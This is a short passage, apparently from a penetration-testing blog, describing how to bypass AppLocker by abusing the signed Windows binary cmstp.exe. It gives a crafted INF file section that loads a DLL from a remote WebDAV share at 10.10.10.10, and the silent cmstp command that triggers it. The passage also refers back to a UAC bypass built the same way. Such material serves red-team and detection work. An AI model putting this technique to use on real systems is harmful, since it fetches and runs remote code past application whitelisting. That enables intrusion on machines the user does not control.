</head><body>This can for instance be used to bypass AppLocker in certain scenarios.<br/>
To do this you can follow the same CMAK wizard as we did in the UAC bypass.<br/>
<br/>
The things you need to add to the INF file is the following (You could also load dll from disk):<br/>
<br/>
[RegisterOCXSection]<br/>
\\10.10.10.10\webdav\AllTheThings.dll<br/>
<br/>
Before you run this command, you will also need to have the CorpVPN.cmp and CorpVPN.cms in the same folder as the inf file<br/>
<br/>
And of course your DLL file needs to be placed on the Webdav server.<br/>
<br/>
You should now be able to run the following command to load the DLL from a Webdav server.<br/>
<br/>
cmstp.exe /ni /s c:\cmstp\CorpVPN.inf</body></html>
